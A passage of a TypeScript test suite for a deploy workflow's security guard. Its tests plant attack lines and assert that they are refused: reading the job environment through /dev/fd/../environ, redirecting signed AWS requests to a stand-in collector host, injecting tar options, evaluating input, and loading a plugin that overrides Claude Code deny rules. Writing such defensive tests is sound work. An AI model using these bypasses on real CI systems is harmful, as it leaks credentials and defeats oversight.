            'LoadBalancerRealtimeTargets',
            'LoadBalancerWsRule',
            'LoadBalancerApiRule',
            'ParametersApiTargetGroup',
            'ParametersRealtimeTargetGroup',
          ],
          plainHttp,
        )(dir)
        behindTargetGroups(dir)
      },
      EARLIER,
    ],
    ["the restore stage's api and realtime behind target groups", behindTargetGroups, UNSEALED],
    [
      "prod's listener in plain HTTP with no certificate",
      inTemplate(prod, 'Platform', json => plainHttp(json.Resources)),
      EARLIER,
    ],
    [
      "a subnet of non-prod's giving a public address on launch",
      inTemplate(nonprod, 'Platform', json => {
        const subnet = ofTypeIn(json.Resources, 'AWS::EC2::Subnet')[0]
        if (subnet === undefined) throw new Error('no subnet')
        subnet.Properties.MapPublicIpOnLaunch = true
      }),
      EARLIER,
    ],
  ] as const)(
    'refuses %s, which passed the text without its rule (round 12’s fourth iteration, its second pass)',
    (_, plant, without) => {
      expect(check(plant)).toBe(NETWORK)
      expect(check(plant, RELEASE, source, process.env.PATH, without)).toBe('passed')
    },
    30_000,
  )
})

// The deny rules (C11-D77; T24 item 21; review RULES-01). Claude Code reads a `:*` as a prefix wildcard only
// at a Bash rule's end; anywhere else its colon is a literal character, so `Bash(gh api:*dispatches*)`
// would match no real command and refuse nothing. A rule with text after a wildcard is written with a
// space, `Bash(gh api *dispatches*)`. This reads the committed settings and refuses a `:*` elsewhere.
describe('C11-D77: the deny rules in .claude/settings.json', () => {
  const midRule = (deny: readonly string[]) =>
    deny.filter(rule => /^Bash\(.*\)$/s.test(rule) && rule.slice(5, -1).replace(/:\*$/, '').includes(':*'))

  it('finds a :* anywhere but at a Bash rule’s end', () => {
    expect(
      midRule([
        'Bash(gh api:*pending_deployments*)',
        'Bash(gh run rerun:*)',
        'Bash(gh api *dispatches*)',
        'Bash(*scripts/x.sh apply*)',
        'Bash(a:*b:*)',
        'mcp__github__actions_run_trigger',
      ]),
    ).toEqual(['Bash(gh api:*pending_deployments*)', 'Bash(a:*b:*)'])
  })

  it('holds the repository', () => {
    const settings = JSON.parse(readRepoFile('.claude/settings.json')) as { permissions?: { deny?: unknown } }
    const deny = settings.permissions?.deny
    expect(Array.isArray(deny) && deny.length > 0 && deny.every(rule => typeof rule === 'string')).toBe(true)
    expect(midRule(deny as string[])).toEqual([])
  })
})

// The repository carries no plugin (C11-D77; T24 item 21; the owner's answer of 12 Nov 2026 and review 4
// RULES-02). A folder under .claude/skills/ holding a .claude-plugin/plugin.json loads as <name>@skills-dir,
// its hooks and any mod included, for every collaborator who trusts the folder, and a mod that handles
// tool.check can approve a call a deny rule refuses; a settings file there that enables a plugin or names
// a marketplace brings one in from outside. So no file under .claude/ is a plugin's manifest (any
// .claude-plugin/ folder) or a plugin's hooks file (hooks/hooks.json), and no settings file there, the
// local one included should it be committed, holds enabledPlugins or extraKnownMarketplaces.
describe('C11-D77: the repository carries and enables no plugin', () => {
  const pluginFindings = (texts: ReadonlyArray<readonly [string, string]>) =>
    texts.flatMap(([path, text]) => {
      if (!path.startsWith('.claude/')) return []
      if (/(?:^|\/)\.claude-plugin(?:\/|$)/.test(path)) return [`${path}: a plugin's manifest`]
      if (/(?:^|\/)hooks\/hooks\.json$/.test(path)) return [`${path}: a plugin's hooks file`]
      if (!/^\.claude\/settings(?:\.local)?\.json$/.test(path)) return []
      let settings: unknown
      try {
        settings = JSON.parse(text)
      } catch {
        return [`${path}: isn't JSON`]
      }
      if (typeof settings !== 'object' || settings === null || Array.isArray(settings))
        return [`${path}: isn't an object`]
      return ['enabledPlugins', 'extraKnownMarketplaces']
        .filter(key => Object.hasOwn(settings, key))
        .map(key => `${path}: names ${key}`)
    })

  it('finds a plugin manifest, a plugin hooks file and a plugin or marketplace in settings, on planted files', () => {
    const settings = JSON.parse(readRepoFile('.claude/settings.json')) as Record<string, unknown>
    expect(
      pluginFindings([
        ['.claude/skills/tidy/.claude-plugin/plugin.json', '{"name":"tidy"}'],
        ['.claude/skills/tidy/hooks/hooks.json', '{}'],
        ['.claude/skills/tidy/SKILL.md', 'A skill.'],
        ['.claude/hooks/auto-push.sh', '#!/bin/sh'],
        [
          '.claude/settings.json',
          JSON.stringify({ ...settings, enabledPlugins: { 'tidy@market': true }, extraKnownMarketplaces: {} }),
        ],
        ['.claude/settings.local.json', JSON.stringify({ enabledPlugins: {} })],
        ['.claude/settings.json', '{'],
        ['docs/.claude-plugin/plugin.json', '{}'],
      ]),
    ).toEqual([
      ".claude/skills/tidy/.claude-plugin/plugin.json: a plugin's manifest",
      ".claude/skills/tidy/hooks/hooks.json: a plugin's hooks file",
      '.claude/settings.json: names enabledPlugins',
      '.claude/settings.json: names extraKnownMarketplaces',
      '.claude/settings.local.json: names enabledPlugins',
      ".claude/settings.json: isn't JSON",
    ])
  })

  it('holds the repository', () => {
    const claude = files.filter(path => path.startsWith('.claude/'))
    expect(claude).toContain('.claude/settings.json')
    expect(pluginFindings(claude.map(path => [path, readRepoFile(path)] as const))).toEqual([])
  })
})

// The seventh review's second attack on the allowlist: each way past it the attackers proved, planted as they
// planted it, is found at its root. A canonical text handed a held tool an environment of its own (an export
// of TAR_OPTIONS before CLI_FETCH's tar), set a name by a printf -v joined to it, quoted or escaped, or by a
// default or an element's assignment, and handed jq a flag written in quotes; a check's call stood in a
// substitution an || swallowed; a checkout stood in a step group no rule read; and the assembly prod's rollback
// job deploys was never diffed before its approval.
describe('Round 7, attack 2: the ways past the allowlist (DPW-02, DPW-10, DPW-11, DPW-13, DPW-14)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const commands = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${COMMANDS}`
  const tools = (name: string, line: number) =>
    `${GUARD}: DPW-10 ${name}, line ${line}: hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line`

  // FETCH-A2-01: a held tool's line is held with its environment. An export before CLI_FETCH's tar (or
  // IMAGE_CHECK's) handed tar options from TAR_OPTIONS, a checkpoint action among them, on a line the guard
  // writes; a canonical text now exports only on its listed lines, sets no option that exports, wraps nothing
  // and runs only CANONICAL_COMMANDS and the canonical texts' functions.
  it("holds a canonical text's commands and the environment it hands them to closed lists (FETCH-A2-01)", () => {
    const tar = 'tar -xzf "$RUNNER_TEMP/aws-cdk/aws-cdk.tgz" -C "$RUNNER_TEMP/aws-cdk" --no-same-owner'
    const exported = "export TAR_OPTIONS='--checkpoint=1 --checkpoint-action=echo=hearth-plant-checkpoint'"
    const fetch = CLI_FETCH.replace(`\n${tar}`, `\n${exported}\n${tar}`)
    expect(fetch).not.toBe(CLI_FETCH)
    expect(canonicalTextFindings({ CLI_FETCH: fetch })).toContain(
      commands('CLI_FETCH', fetch.split('\n').indexOf(exported) + 1),
    )
    const extract = '  tar --extract --file - --directory "$2" --no-same-owner --no-same-permissions <"$1"'
    const image = IMAGE_CHECK.replace(`\n${extract}`, `\n  ${exported}\n${extract}`)
    expect(image).not.toBe(IMAGE_CHECK)
    expect(canonicalTextFindings({ IMAGE_CHECK: image })).toContain(
      commands('IMAGE_CHECK', image.split('\n').indexOf(`  ${exported}`) + 1),
    )
    for (const [text, line] of [
      ['f() {\n  local -x TAR_OPTIONS=--checkpoint=1\n}', 2],
      ['export -n CDK', 1],
      ['set -a\nTAR_OPTIONS=x', 1],
      ['set -o allexport', 1],
      ['set -k', 1],
      [`TAR_OPTIONS=x ${tar}`, 1],
      [`env TAR_OPTIONS=x ${tar}`, 1],
      ['XDG_CONFIG_HOME="$RUNNER_TEMP/x"', 1],
      ['HOME="$RUNNER_TEMP/x"', 1],
      ['x=$1\neval "$x"', 2],
      ['source "$1"', 1],
      ['. "$1"', 1],
      ["trap 'echo $1' EXIT", 1],
      ["alias jq='jq -f x'", 1],
      ['shopt -s extdebug', 1],
      ['readonly x=1', 1],
      ['coproc x { cat; }', 1],
      [`"jq" -f p.jq f`, 1],
      [`\\jq -f p.jq f`, 1],
      [`j''q -f p.jq f`, 1],
      ['x=jq\n$x -f p.jq f', 2],
      ['command jq -n .', 1],
      ['builtin printf -v "a[$x]" %s 1', 1],
    ] as const) {
      expect(canonicalTextFindings({ X: text }), text).toContain(commands('X', line))
    }
    // What the texts hold passes: the listed exports, IFS before read, set -euo pipefail, the functions any
    // canonical text defines, run and get.
    for (const text of [
      PREAMBLE.split('\n').at(-1) ?? '',
      CDK_FOLDER,
      'set -euo pipefail',
      `while IFS= read -r x; do :; done <<<"$y"`,
      `IFS=$'\\t' read -r a b <<<"$y"`,
      'one_off_end migrate "$MIGRATE_LINES" "$RUN"',
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$task" --output json)',
    ]) {
      expect(canonicalCommandLines(text, new Set(['one_off_end', 'get', 'run', 'mask'])), text).toEqual([])
    }
  })

  // EXPAND-A2-01: printf -v joined to its name, quoted or escaped, and a descriptor's variable, each name a
  // subscript bash evaluates, which the spaced printf -v alone was read for.
  it('holds printf in a canonical text to a single-quoted format or a plain -v, and names no descriptor (EXPAND-A2-01)', () => {
    for (const text of [
      'x=$(jq -r .n f.json)\nprintf -v"a[$x]" %s 1',
      'x=$(jq -r .n f.json)\nprintf -va[$x] %s 1',
      'x=$(jq -r .n f.json)\nprintf "-v" "a[$x]" %s 1',
      `x=$(jq -r .n f.json)\nprintf \\-v "a[$x]" '%s' 1`,
    ]) {
      expect(canonicalTextFindings({ X: text }), text).toContain(tools('X', 2))
    }
    expect(canonicalTextFindings({ X: 'x=$(jq -r .n f.json)\necho hi {a[$x]}>/dev/null' }).join('\n')).toMatch(
      /DPW-10 X, line 2: evaluates/,
    )
    // Round 11: %n sets the variable its argument names (PATH, or a held name such as STAGE), and the other
    // conversions are none a text writes; a format of %s, %% and plain text alone passes.
    for (const text of [
      'x=1\nprintf \'aws-check: checking %s%n\\n\' "$x" PATH',
      "x=1\nprintf '%n' STAGE",
      "x=1\nprintf '%5n' TMOUT",
      'x=1\nprintf \'%d\\n\' "$x"',
      'x=1\nprintf \'%b\' "$x"',
      'x=1\nprintf -v y \'%q\' "$x"',
      'x=1\nprintf \'% s\' "$x"',
    ]) {
      expect(canonicalTextFindings({ X: text }), text).toContain(tools('X', 2))
    }
    for (const text of ['x=1\nprintf \'%s\\n\' "$x"', 'x=1\nprintf \'100%% %s\' "$x"', "x=1\nprintf 'go=false\\n'"]) {
      expect(canonicalTextFindings({ X: text }).join('\n'), text).not.toMatch(/line 2: hands jq/)
    }
    // TASKS_OUTPUTS planted as the attackers planted it: a revision kept by printf -v joined to its name.
    const anchor = `    definition=$(output "\${kind^}TaskDefinition")\n`
    expect(TASKS_OUTPUTS).toContain(anchor)
    const planted = TASKS_OUTPUTS.replace(
      anchor,
      `${anchor}    revision="\${definition##*:}"\n    printf -v"revisions[$revision]" '%s' "$kind"\n`,
    )
    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted }).join('\n')).toMatch(/DPW-10 TASKS_OUTPUTS, line \d+/)
  })

  // FLOW-A2-01: a check called inside $( … ) refuses in the substitution's subshell, and an || then goes on; a
  // call in a pipeline, after !, beside && or || or as a condition has its failure ignored by set -e. Each
  // canonical check, and each record job's function, is held to standing alone.
  it("holds each check's call to standing alone, so its refusal ends the step (FLOW-A2-01)", () => {
    const assembly = '          check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"\n'
    for (const call of [
      'CHECKED=$(check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER") || echo "$CHECKED"',
      'check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER" | tee -a "$GITHUB_STEP_SUMMARY"',
      '! check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"',
      'check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER" || echo x',
      'echo x && check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"',
      'if check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"; then echo x; fi',
      'if [ a = b ]; then echo x; elif check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"; then echo y; fi',
      '{ check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"; } || echo x',
    ]) {
      expect(credentialed(plant(assembly, `          ${call}\n`, job('nonprod'))), call).toContain(
        at('DPW-10', 'nonprod (Check the assembly)', HELD),
      )
    }
    expect(
      credentialed(
        plant(
          '            *) aws_check "$MODE" ;;\n',
          '            *) CHECKED=$(aws_check "$MODE") || echo "aws-check: $CHECKED" ;;\n',
          job('nonprod'),
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (What runs)', HELD))
    expect(
      credentialed(
        plant(
          '          unpack_image "$RUNNER_TEMP/image/image.tar" "$RUNNER_TEMP/image-layout"\n',
          '          X=$(unpack_image "$RUNNER_TEMP/image/image.tar" "$RUNNER_TEMP/image-layout") || echo "$X"\n',
          job('nonprod'),
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (Check and unpack the image)', HELD))
    for (const [from, to] of [
      [
        '            PAYLOAD=$(release_payload "$KIND" "$COMMIT" "$DIGEST" "$SERVICES")\n',
        '            PAYLOAD=$(release_payload "$KIND" "$COMMIT" "$DIGEST" "$SERVICES") || echo x\n',
      ],
      ['            record hearth-release "$PAYLOAD"\n', '            record hearth-release "$PAYLOAD" || echo x\n'],
    ] as const) {
      expect(releaseFindings(plant(from, to, job('record-nonprod'))), to).toContain(
        at('DPW-13', 'record-nonprod (Write the record)', HELD),
      )
    }
    // Every job's check call is held so, the synth jobs' too, which no credential rule reads (DPW-14).
    expect(
      assetCheckFindings(
        plant(assembly, '          check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER" || echo x\n', job('synth')),
      ),
    ).toContain(at('DPW-14', "synth (Check the release's assembly)", STANDS_ALONE))
    expect(
      assetCheckFindings(
        plant(
          '          check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"\n',
          '          X=$(check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER") || echo "$X"\n',
          job('synth-previous-prod'),
        ),
      ),
    ).toContain(at('DPW-14', "synth-previous-prod (Check prod's previous assembly)", STANDS_ALONE))
    expect(
      assetCheckFindings(
        plant(
          '            *) aws_check "$MODE" ;;\n',
          '            *) aws_check "$MODE" || echo x ;;\n',
          job('nonprod'),
        ),
      ),
    ).toContain(at('DPW-14', 'nonprod (What runs)', STANDS_ALONE))
    // The reader says which commands stand alone.
    const alone = (run: string) => readShell(run).commands.map(each => [each.name ?? '=', each.alone])
    expect(alone('a x\nb x | c\n! d\ne || f\nif g; then h; fi\n{ i; } && j')).toEqual([
      ['a', true],
      ['b', false],
      ['c', false],
      ['d', false],
      ['e', false],
      ['f', false],
      ['g', false],
      ['h', true],
      ['if', true],
      ['i', false],
      ['{', false],
      ['j', false],
    ])
  }, 60_000)

  // YAML-A2-01: a step group (parallel:) holds steps GitHub runs as background steps, which workflow.ts reads
  // as one step with no uses:, so a checkout in one was never held to persist-credentials: false.
  it('refuses a step of a kind workflow.ts doesn’t read, in every workflow (YAML-A2-01)', () => {
    const checkout = '      - uses: actions/checkout@v5\n        with:\n          persist-credentials: false\n'
    const ORDINARY =
      'is an ordinary step, of the keys workflow.ts reads (no parallel group, background, wait, wait-all or cancel step, whose steps or kind no rule reads)'
    const planted = plant(checkout, '      - parallel:\n          - uses: actions/checkout@v5\n', '  audit:\n', CI)
    expect(permissionFindings(planted)).toContain(`${CI}: DPW-02 audit (step 1): ${ORDINARY}`)
    const added = '.github/workflows/preview.yml'
    const preview = [
      'name: Preview',
      'on:',
      '  push:',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  preview:',
      '    runs-on: ubuntu-24.04',
      '    steps:',
      '      - parallel:',
      '          - name: Check out',
      '            uses: actions/checkout@v5',
      '      - wait-all: true',
      '',
    ].join('\n')
    expect(permissionFindings(new Map([...workflows, [added, preview]]))).toEqual([
      `${added}: DPW-02 preview (step 1): ${ORDINARY}`,
      `${added}: DPW-02 preview (step 2): ${ORDINARY}`,
    ])
  })

  // Round 11: an action of this repository (./ after a checkout, or $/, which needs none) runs the steps of an
  // action.yml outside .github/workflows/, which no rule reads and the owner's read doesn't cover, so its own
  // checkout could keep the job's token; a docker:// image is no action's commit either. Every workflow's steps
  // name another repository's action by owner/repo@ref.
  it('refuses an action of this repository or a docker:// image, in every workflow (round 11)', () => {
    const REMOTE =
      "uses another repository's action, owner/repo@ref, never one of this repository's (./, .\\ or $/, or this repository by its name), whose action.yml no rule reads, an action in a repository's .github folder or a path that climbs out of its own (. or ..) or splits at \\, or a docker:// image"
    const added = '.github/workflows/lint.yml'
    const lint = (uses: string) =>
      [
        'name: Lint',
        'on:',
        '  push:',
        'permissions:',
        '  contents: read',
        'jobs:',
        '  lint:',
        '    runs-on: ubuntu-24.04',
        '    steps:',
        `      - uses: ${uses}`,
        '',
      ].join('\n')
    for (const uses of [
      './.github/actions/setup',
      '$/.github/actions/setup',
      '.\\.github\\actions\\setup',
      'docker://alpine:3.20',
      `docker://alpine@sha256:${'0'.repeat(64)}`,
      'actions/checkout',
      'actions@v5',
    ]) {
      expect(permissionFindings(new Map([...workflows, [added, lint(uses)]])), uses).toEqual([
        `${added}: DPW-02 lint (step 1): ${REMOTE}`,
      ])
    }
    for (const uses of ['actions/checkout@v5', 'actions/cache/restore@v4', `actions/checkout@${'a'.repeat(40)}`]) {
      expect(permissionFindings(new Map([...workflows, [added, lint(uses)]])), uses).toEqual([])
    }
    const audit = '      - uses: actions/checkout@v5\n'
    expect(readRepoFile(CI)).toContain(audit)
    expect(permissionFindings(plant(audit, '      - uses: ./.github/actions/setup\n', '  audit:\n', CI))).toContain(
      `${CI}: DPW-02 audit (step 1): ${REMOTE}`,
    )
  })

  // Round 11: workflow.ts read an environment: block mapping by its name alone, so prod's written with
  // deployment: false passed DPW-02 and DPW-03 while GitHub recorded no deployment for the job, the history the
  // quarterly review and break-glass-review.md match each deploy session against. Each environment is a
  // scalar on its own line. A line ending in a blank, which workflow.ts read as gone from a block scalar's line
  // of blanks while YAML keeps it, is refused in every workflow.
  it('refuses an environment written as a mapping, and a line ending in a blank, in every workflow (round 11)', () => {
    const one = '    environment: prod\n'
    for (const mapping of [
      '    environment:\n      name: prod\n      deployment: false\n',
      '    environment:\n      name: prod\n',
      '    environment:\n      name: prod\n      url: https://example.org\n',
    ]) {
      const planted = plant(one, mapping, job('prod'))
      expect(permissionFindings(planted), mapping).toContain(
        `${DEPLOY}: DPW-02 prod: names its environment by a literal name`,
      )
      expect(credentialJobFindings(planted), mapping).toContain(`${DEPLOY}: DPW-03 prod: names the environment prod`)
    }
    for (const [path, text] of workflows) {
      expect(
        text.split('\n').filter(line => /[ \t]$/.test(line)),
        path,
      ).toEqual([])
      const lines = text.split('\n')
      const run = lines.findIndex(line => /^\s+run: \|/.test(line))
      if (run < 0) continue
      lines.splice(run + 1, 0, `${' '.repeat(16)}`)
      expect(permissionFindings(new Map([...workflows, [path, lines.join('\n')]])), path).toContain(
        `${path}: DPW-02 ends no line in a blank`,
      )
    }
  })

  // INPUTS-A2-01: a release's own code can tell its rebuild as prod's previous release (the CLI hands the app
  // its output folder) from its own deploy and write a resource only into the rebuild, which prod's rollback
  // job deploys behind an approval no diff showed it to. prod-plan now diffs that very assembly, checked as
  // the rollback job checks it, against what prod runs, into its own summary before prod's approval.
  it("diffs, in prod-plan, the very assembly prod's rollback job deploys (INPUTS-A2-01)", () => {
    const stepsOf = (id: string) => {
      const found = workflowJobs(deployText).find(each => each.id === id)
      if (found === undefined) throw new Error(`no job ${id}`)
      return parsedSteps(found)
    }
    const steps = stepsOf('prod-plan')
    const named = (name: string) => steps.find(step => step.name === name)
    const download = named("Download prod's previous assembly")
    const deployed = stepsOf('rollback-prod').find(step => step.name === 'Download the previous assembly')
    expect(download?.with.get('artifact-ids')).toBe(deployed?.with.get('artifact-ids'))
    expect(download?.with.get('path')).toBe(deployed?.with.get('path'))
    expect(named('Check the previous assembly')?.run).toBe(
      [
        STOP_HEAD,
        ASSET_CHECK,
        'check_assembly "$RUNNER_TEMP/$ASSEMBLY_FOLDER"',
        'check_release_in "$RUNNER_TEMP/$ASSEMBLY_FOLDER" "$RELEASE"',
      ].join('\n'),
    )
    // The folder it checks is the one prod's rollback job downloads, and the release the previous one.
    expect(named('Check the previous assembly')?.env.get('ASSEMBLY_FOLDER')).toBe('assembly-previous')
    expect(named('Check the previous assembly')?.env.get('RELEASE')).toBe(
      `\${{ needs.gate.outputs.previous_prod_commit }}:\${{ needs.gate.outputs.previous_prod_digest }}`,
    )
    expect(named('Diff the rollback')?.run).toBe(ROLLBACK_DIFF_RUN)
    expect(ROLLBACK_DIFF_RUN).toContain('ASSEMBLY="$RUNNER_TEMP/assembly-previous"')
    expect(ROLLBACK_DIFF_RUN).toContain("### What prod's automatic rollback changes")
    for (const name of ["Download prod's previous assembly", 'Check the previous assembly', 'Diff the rollback']) {
      expect(named(name)?.if, name).toBe(
        `\${{ needs.synth-previous-prod.outputs.assembly != '' && needs.gate.outputs.mode == 'deploy' }}`,
      )
    }
    const CHECKED =
      "runs ASSET_CHECK on each folder it downloaded, in a step of its own that checks the folder its ASSEMBLY_FOLDER names (one of ASSEMBLY_FOLDERS, the download's) against the release its RELEASE names (the one that folder holds), after its download, under its download's if: or none, and before the credentials action"
    expect(assetCheckFindings(removedStep('prod-plan', 'Check the previous assembly'))).toEqual([
      at('DPW-14', 'prod-plan', CHECKED),
    ])
    const previous = stepText(deployText, 'prod-plan', 'Check the previous assembly')
    expect(
      assetCheckFindings(
        withText(
          DEPLOY,
          edited(
            deployText,
            previous,
            previous.replace(
              `if: \${{ needs.synth-previous-prod.outputs.assembly != '' && needs.gate.outputs.mode == 'deploy' }}`,
              `if: \${{ needs.gate.outputs.mode == 'rollback' }}`,
            ),
            job('prod-plan'),
          ),
        ),
      ),
    ).toEqual([at('DPW-14', 'prod-plan', CHECKED)])
    // The rollback's diff is pinned whole, so it diffs no other folder.
    const diff = stepText(deployText, 'prod-plan', 'Diff the rollback')
    expect(
      prodPathFindings(
        withText(
          DEPLOY,
          edited(
            deployText,
            diff,
            diff.replace('ASSEMBLY="$RUNNER_TEMP/assembly-previous"', 'ASSEMBLY="$RUNNER_TEMP/assembly"'),
            job('prod-plan'),
          ),
        ),
      ),
    ).toContain(at('DPW-08', 'prod-plan (Diff the rollback)', PINNED_08))
  }, 60_000)
})

describe('Round 7, attack 3: the ways past the allowlist (DPW-07, DPW-10)', () => {
  const TOOLS =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const tools = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${TOOLS}`
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const commands = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${COMMANDS}`
  // A canonical text with one line replaced, or added before one, and the 1-based line the change stands on.
  const replaced = (text: string, from: string, to: string) => {
    expect(text.split('\n').filter(each => each.trim() === from.trim())).toHaveLength(1)
    const lines = text.split('\n').map(each => (each.trim() === from.trim() ? each.replace(from.trim(), to) : each))
    return { planted: lines.join('\n'), line: lines.findIndex(each => each.includes(to)) + 1 }
  }
  const before = (text: string, anchor: string, added: string) => {
    expect(text).toContain(anchor)
    const planted = text.replace(anchor, `${added}\n${anchor}`)
    return { planted, line: planted.split('\n').indexOf(added) + 1 }
  }

  // FETCH-A3-01: an aws line inside a canonical text was never read for its options (awsIsHeld read only a
  // run's own lines), so AWS_CHECK's ECR read could send the deploy role's signed request to another host and
  // trust its answer. A canonical text's aws is now held to its calls and options as the guard writes them.
  it("holds a canonical text's aws to the calls and options the workflow uses (FETCH-A3-01)", () => {
    const ecr = `tags=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$2" --query 'imageDetails[0].imageTags' --output json) || return 1`
    const endpoint = replaced(
      AWS_CHECK,
      ecr,
      ecr.replace(" --query 'imageDetails", " --endpoint-url https://collector.invalid.example/ --query 'imageDetails"),
    )
    // (A planted copy of a text that evaluates is no canonical text, so readsAsBash() names it too.)
    expect(canonicalTextFindings({ AWS_CHECK: endpoint.planted })).toContain(tools('AWS_CHECK', endpoint.line))
    const ended = `ended=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$task" --query 'tasks[0].{exit: containers[0].exitCode, stop: stopCode}' --output json)`
    const unverified = replaced(ONE_OFF, ended, ended.replace(' --output json', ' --no-verify-ssl --output json'))
    expect(canonicalTextFindings({ ONE_OFF: unverified.planted })).toContain(tools('ONE_OFF', unverified.line))
    for (const line of [
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --ca-bundle x.pem --output json)',
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --profile other --output json)',
      'run aws ecs wait tasks-stopped --cluster "$CLUSTER" --tasks "$task" --debug',
      `x=$(get aws ecs describe-tasks --cluster "$CLUSTER" '--endpoint-url' https://x.example --output json)`,
      'x=$(get aws ecs describe-tasks --cli-input-json file://x.json)',
      'x=$(get aws ecs describe-tasks --cluster file:///dev/fd/../environ --output json)',
      'x=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageTag@=x" --output json)',
      // An expansion bash splits could hand aws an option as it runs.
      'x=$(get aws ecs describe-tasks --cluster $CLUSTER --tasks "$task" --output json)',
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks {a,b} --output json)',
      // A value of more than one word but PROBE's task list could be an option as it runs.
      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$@" --output json)',
      `x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$\{tasks[@]}" --output json)`,
      // The registry password is only the push's own line's, and a call the workflow doesn't make is refused.
      'x=$(get aws ecr get-login-password --region ap-southeast-1)',
      'run aws s3 cp x y',
      'x=$(get aws "ecs" describe-tasks --cluster "$CLUSTER")',
      // A value after a flag that takes none.
      'x=$(get aws logs get-log-events --log-group-name "/x" --start-from-head https://x.example)',
    ]) {
      expect(canonicalToolLines(line), line).toEqual([0])
    }
    // What the texts hold passes: every option the one-offs, the log read and the read-backs use.
    for (const text of [ONE_OFF, AWS_CHECK, TASKS_OUTPUTS, PROBE, RESTORE_DOWN])
      expect(canonicalToolLines(text)).toEqual([])
  })

  // COMMANDS-A3-01: grep, wc, readlink and realpath in a canonical text were held by name alone, so a grep added
  // to AWS_CHECK read the job's environment by /dev/fd/../environ (no literal /proc/) and printed it in pieces
  // no mask joins. Every program a canonical text runs is now held by what it is handed: a rule, or its line
  // as the guard writes it; and a file is read by a redirection only on such a line.
  it('holds every program a canonical text runs by what it is handed, and every file it reads (COMMANDS-A3-01)', () => {
    const environ = before(
      AWS_CHECK,
      '  echo \'go=true\' >>"$GITHUB_OUTPUT"',
      "  grep -aoE '[^=]{1,12}' /dev/fd/../environ || true",
    )
    expect(canonicalTextFindings({ AWS_CHECK: environ.planted })).toContain(tools('AWS_CHECK', environ.line))
    for (const line of [
      // Each plain tool off its held line.
      "grep -aoE '.{1,12}' /dev/fd/../environ || true",
      'x=$(wc -c /dev/fd/../environ)',
      'x=$(readlink -f /dev/fd)',
      'x=$(realpath -m -- /dev/fd/..)',
      'x=$(printf \'%s\\n\' "$y" | sort -o "$z" -u)',
      'git -c core.fsmonitor=x merge-base --is-ancestor "$1" "$2"',
      "node -e 'process.exit(0)' infra/scripts/deploy/history.ts",
      'sleep "$x"',
      'x=$(mktemp -p /tmp)',
      'cd /dev/fd/..',
      // A file read by a redirection, by any builtin, off a held line.
      'IFS= read -r x </dev/fd/../environ || true',
      'echo "$(</dev/fd/../environ)"',
      ': <"$RUNNER_TEMP/x"',
      'mapfile -t x <"$y"',
      'echo "$(( 1 < 2 ))"',
      // tee to a file but the summary.
      'printf \'%s\\n\' x | tee -a "$GITHUB_STEP_SUMMARY" "$RUNNER_TEMP/x"',
      // jq's data from outside the assembly's or the temp folder, a .. part, or a word bash splits.
      'x=$(jq -r . /dev/fd/../environ)',
      `x=$(jq -r '.auths' "$XDG_RUNTIME_DIR/containers/auth.json")`,
      `x=$(jq -r '.a' "$dir/../x.json")`,
      `x=$(jq -r '.a' $f)`,
      `x=$(jq -r '.a' "$HOME/x.json")`,
      `x=$(jq -r '.a' "$\{files[@]}")`,
      `x=$(jq -n --arg x "$@" '$x')`,
    ]) {
      expect(canonicalToolLines(line), line).toEqual([0])
    }
    // A read from a here-string, a process substitution or /dev/null, and a line the guard writes, pass.
    for (const line of [
      `x=$(jq -r '.a' <<<"$y")`,
      `while IFS= read -r x; do :; done < <(jq -r '.a' "$dir/manifest.json")`,
      'IFS= read -r x </dev/null || true',
      'tee -a "$GITHUB_STEP_SUMMARY" <"$RUNNER_TEMP/prod-gate-ignored.txt" >&2',
      // (jq's data words are seven literals since the eighth review's second attack, "$RUNNER_TEMP/…" no longer
      // any path under the temp folder.)
      `x=$(jq -r '.a' "$RUNNER_TEMP/aws-cdk/package/package.json" "$\{stackfiles[@]}" infra/package.json)`,
    ]) {
